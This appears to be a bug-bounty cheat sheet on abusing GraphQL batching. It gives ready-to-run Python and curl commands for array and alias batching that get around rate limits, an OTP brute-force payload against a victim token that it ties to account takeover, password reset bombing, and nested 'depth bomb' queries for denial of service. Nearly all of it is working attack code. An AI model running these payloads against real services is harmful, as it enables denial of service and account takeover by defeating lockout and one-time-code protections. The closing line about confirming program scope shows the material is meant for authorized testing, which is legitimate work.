# Batching DoS — Amplifier Hunting

GraphQL allows sending multiple operations in one POST. No rate limit = DoS
or brute-force amplifier. Run `scripts/gql_batch_probe.py` for the automated
timing probe, or manually:

## Array batching (most common)

```bash
python3 -c "
import json, sys
q = {'query': '{ __typename }'}
print(json.dumps([q] * 100))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @- -w '\nTime: %{time_total}s\n'
```

## Alias batching (bypasses per-query limits)

```bash
python3 -c "
aliases = ' '.join(f'q{i}: __typename' for i in range(500))
print('{\"query\": \"{ ' + aliases + ' }\"}')
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' -d @-
```

## Impact escalation

- **Brute force amplifier:** 100 login mutations per HTTP request → bypasses per-IP lockout
- **OTP bypass:** 1000 alias queries testing OTP codes in one request
- **Password reset bombing:** 100 resetPassword mutations, each with a different email

```bash
# OTP brute force via alias batching — chain with account takeover
python3 -c "
import json
mutations = []
for code in range(1000, 2000):
    mutations.append(f'v{code}: verifyOTP(code: \"{code}\", token: \"VICTIM_TOKEN\") {{ success }}')
query = '{ ' + ' '.join(mutations) + ' }'
print(json.dumps({'query': query}))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' -d @-
```

## Depth bombs

```bash
python3 -c "
depth = 20
inner = 'id email'
for _ in range(depth):
    inner = f'friends {{ id {inner} }}'
print('{\"query\": \"{ me { ' + inner + ' } }\"}')
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' -d @- -w '\nTime: %{time_total}s\n'
```

If response time grows linearly → report as DoS (after confirming the program
accepts availability-impact findings).
